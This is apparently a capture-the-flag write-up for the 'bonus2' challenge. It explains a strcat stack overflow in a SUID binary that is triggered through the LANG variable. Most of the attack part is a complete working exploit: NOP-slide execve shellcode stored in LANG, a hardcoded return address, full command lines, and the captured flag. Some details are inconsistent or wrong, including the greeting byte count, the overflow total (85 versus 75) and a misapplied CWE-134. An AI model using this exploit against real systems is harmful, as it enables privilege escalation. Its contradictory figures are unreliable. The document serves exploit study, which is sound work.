# Bonus2 Analysis - Environment Variable + strcat Buffer Overflow

## Overview
Bonus2 demonstrates a sophisticated **environment variable exploitation** technique combined with **internationalization-based buffer overflow**. The challenge exploits language-specific greetings to achieve different overflow lengths, using the `LANG` environment variable both as a trigger mechanism and shellcode storage location.

## Binary Information
- **File**: ELF 32-bit LSB executable, Intel 80386, dynamically linked
- **Permissions**: -rwsr-s---+ 1 bonus3 users (SUID bit set for bonus3)
- **Size**: 5664 bytes
- **Functions**: main(), greetuser(), strcat(), strncpy(), getenv(), memcmp()
- **BuildID**: f71cccc3c27dfb47071bb0bc981e2dae92a47844

## Source Code Analysis

### Program Structure
```c
int main(int argc, char **argv) {
    char buffer[76];
    char *env_lang;
    int lang = 0;

    if (argc != 3) return 1;

    memset(buffer, 0, 76);
    strncpy(buffer, argv[1], 40);        // Copy first 40 bytes
    strncpy(&buffer[40], argv[2], 32);   // Copy next 32 bytes
    
    // Language detection via LANG environment variable
    env_lang = getenv("LANG");
    if (env_lang != NULL) {
        if (memcmp(env_lang, "fi", 2) == 0)      // Finnish
            lang = 1;
        else if (memcmp(env_lang, "nl", 2) == 0) // Dutch
            lang = 2;
    }
    
    greetuser(buffer, lang);
    return 0;
}

void greetuser(char *user, int lang) {
    char greeting[64];  // 64-byte buffer - VULNERABILITY TARGET
    
    if (lang == 1)
        strcpy(greeting, "Hyvää päivää ");     // Finnish: 13 bytes
    else if (lang == 2)  
        strcpy(greeting, "Goedemiddag! ");     // Dutch: 13 bytes
    else
        strcpy(greeting, "Hello ");            // English: 6 bytes
    
    strcat(greeting, user);  // VULNERABLE: No bounds checking!
    puts(greeting);
}
```

## Vulnerability Analysis

### Primary Vulnerability: strcat Buffer Overflow
```c
char greeting[64];           // Fixed 64-byte buffer
strcat(greeting, user);     // Appends user data without size validation
```

**Overflow Calculation:**
- **User Data**: 40 bytes (argv[1]) + 32 bytes (argv[2]) = 72 bytes
- **Finnish Greeting**: "Hyvää päivää " = 13 bytes
- **Total Length**: 13 + 72 = 85 bytes
- **Buffer Overflow**: 85 - 64 = 21 bytes beyond buffer boundary

### Secondary Vulnerability: Environment Variable Control
```c
env_lang = getenv("LANG");
if (memcmp(env_lang, "fi", 2) == 0)  // User controls LANG content
```

**Exploitation Opportunities:**
- **Content Control**: User controls entire LANG environment variable
- **Trigger Mechanism**: "fi" prefix activates longer greeting (more overflow)
- **Storage Medium**: LANG can store arbitrary data (shellcode)

## Memory Layout Analysis

### Stack Frame in greetuser()
```
Higher Memory Addresses
┌─────────────────────────────────────────────────┐
│ Return Address (4 bytes)                       │ ← EBP + 4 (TARGET)
├─────────────────────────────────────────────────┤
│ Saved EBP (4 bytes)                           │ ← EBP
├─────────────────────────────────────────────────┤
│ Function Parameters                            │
├─────────────────────────────────────────────────┤
│ greeting[64] buffer                           │ ← EBP - 0x48
│ "Hyvää päivää " + user data                   │
└─────────────────────────────────────────────────┘
Lower Memory Addresses

Overflow Path: greeting[64] → 21 bytes overflow → overwrites return address
Distance to return address: 64 + 4 (saved EBP) = 68 bytes
```

### Environment Variable Memory Layout
```bash
# LANG environment variable structure:
# Address: 0xbffffeb5
# Content: "LANG=fi" + NOP slide + shellcode
# Layout:
0xbffffeb5: L A N G = f i \x90 \x90 ... [shellcode]
            ↑               ↑
            Base            Shellcode entry point (+7)
```

## Exploitation Methodology

### Step 1: Environment Variable Preparation
```bash
export LANG=$(python -c 'print("fi" + "\x90" * 100 + shellcode)')

# Components breakdown:
# "fi"              - Language trigger (activates Finnish greeting)
# "\x90" * 100      - NOP slide (provides large landing zone)  
# shellcode         - execve("/bin//sh") payload
```

### Step 2: Address Space Discovery
Using GDB to find the exact LANG variable location:
```gdb
(gdb) break *main+125
(gdb) run A B
(gdb) x/40s *((char**)environ)
# Result: 0xbffffeb5: "LANG=fi\220\220\220..."
```

**Address Calculation:**
- **LANG Base**: `0xbffffeb5`  
- **Shellcode Start**: `0xbffffeb5 + 7` (after "LANG=fi")
- **Target Address**: `0xbffffeb5 + 7 + 42 = 0xbffffeec` (middle of NOP slide)

### Step 3: Payload Construction
```bash
# Argument Structure:
# argv[1]: 40 bytes of padding
# argv[2]: 18 bytes padding + 4 bytes return address

./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xec\xfe\xff\xbf"')

# Memory layout after strcat:
# greeting: "Hyvää päivää " + "A"*40 + "B"*18 + return_address
# Total:     13           +   40   +   18   +      4        = 75 bytes
# Overflow:  75 - 64 = 11 bytes (enough to overwrite return address)
```

## Shellcode Analysis

### Compact execve() Implementation
```assembly
\x6a\x0b       ; push 0x0b              - Push execve syscall number (11)
\x58           ; pop eax                - EAX = 11 (execve system call)
\x99           ; cdq                    - EDX = 0 (clear environment)
\x52           ; push edx               - Push NULL terminator
\x68\x2f\x2f\x73\x68 ; push "//sh"      - Push second part of path
\x68\x2f\x62\x69\x6e ; push "/bin"      - Push first part of path
\x89\xe3       ; mov ebx, esp          - EBX points to "/bin//sh"
\x31\xc9       ; xor ecx, ecx          - ECX = 0 (no arguments)
\xcd\x80       ; int 0x80              - Execute system call

# Result: execve("/bin//sh", NULL, NULL) → spawn shell
```

**Shellcode Characteristics:**
- **Size**: 20 bytes (compact implementation)
- **Null-Free**: No zero bytes (environment variable safe)
- **Self-Contained**: No external dependencies

## Attack Flow Execution

### Complete Exploit Sequence
```bash
# Phase 1: Environment Setup
export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

# Phase 2: Buffer Overflow Trigger
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xec\xfe\xff\xbf"')

# Phase 3: Execution Flow
# 1. main() combines arguments into 72-byte user string
# 2. getenv("LANG") detects "fi" prefix → sets lang = 1
# 3. greetuser() uses Finnish greeting (13 bytes)
# 4. strcat() appends 72-byte user data to 13-byte greeting
# 5. 85-byte result overflows 64-byte buffer by 21 bytes
# 6. Return address overwritten with 0xbffffeec (NOP slide)
# 7. Function return jumps to NOP slide → slides to shellcode
# 8. execve("/bin//sh") spawns privileged shell
```

### Execution Result Analysis
```bash
Output: "Hyvää päivää AAAAAAAA...BBBBBB����"
Status: Shell spawned with bonus3 privileges (SUID escalation)
Verification: whoami → bonus3, id → euid=2013(bonus3)
```

## Advanced Exploitation Techniques

### Environment Variable as Attack Vector
- **Dual Purpose**: LANG serves both as trigger and payload storage
- **Persistence**: Environment survives across program executions  
- **Large Capacity**: Environment variables can store substantial payloads
- **Steganography**: Shellcode hidden within seemingly legitimate LANG value

### Internationalization Exploitation
- **Language-Dependent Overflow**: Different greeting lengths create varying overflow conditions
- **Localization Abuse**: i18n features become security vulnerabilities
- **Cultural Context**: Exploiting human-centric features for technical attacks

### Dynamic Address Resolution
- **Runtime Discovery**: Finding environment addresses during execution
- **ASLR Bypass**: Using relative addressing within environment space
- **NOP Slide Strategy**: Large target area compensates for address uncertainty

## Security Implications

### Vulnerability Classification
- **CWE-120**: Buffer Copy without Checking Size of Input (strcat)
- **CWE-134**: Use of Externally-Controlled Format String (environment)  
- **CWE-427**: Uncontrolled Search Path Element (environment manipulation)

### Attack Surface Analysis
- **Environment Variables**: All user-controlled env vars are potential attack vectors
- **String Concatenation**: Functions like strcat() create overflow opportunities
- **Internationalization**: Localization features can amplify vulnerabilities
- **SUID Binaries**: Privilege escalation amplifies impact

### Modern Mitigations
```c
// Secure implementation approaches:

// 1. Bounds-checked concatenation
if (strlen(greeting) + strlen(user) >= sizeof(greeting))
    return -1;
strncat(greeting, user, sizeof(greeting) - strlen(greeting) - 1);

// 2. Safe string functions
snprintf(greeting, sizeof(greeting), "%s%s", 
         get_localized_greeting(lang), user);

// 3. Environment validation
if (validate_environment_variable(env_lang) != 0)
    return -1;
```

### Defensive Strategies
- **Input Sanitization**: Validate all environment variable content
- **Bounds Checking**: Use size-limited string functions (strncat, snprintf)
- **Environment Lockdown**: Restrict or sanitize inherited environment
- **Stack Protection**: Enable stack canaries, ASLR, NX bit
- **Privilege Separation**: Minimize SUID binary usage

## Flag Retrieved
```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Technical Innovation Assessment

This challenge demonstrates several sophisticated exploitation concepts:

1. **Environment Variable Weaponization**: Using LANG as both trigger and payload storage
2. **Internationalization Exploitation**: Abusing localization for variable overflow lengths  
3. **Two-Stage Attack**: Environment preparation followed by overflow trigger
4. **Dynamic Address Resolution**: Runtime discovery of shellcode location
5. **Cultural Engineering**: Exploiting human-centric software features

The combination of these techniques creates a realistic attack scenario that highlights the security implications of internationalization features and environment variable handling in privileged programs.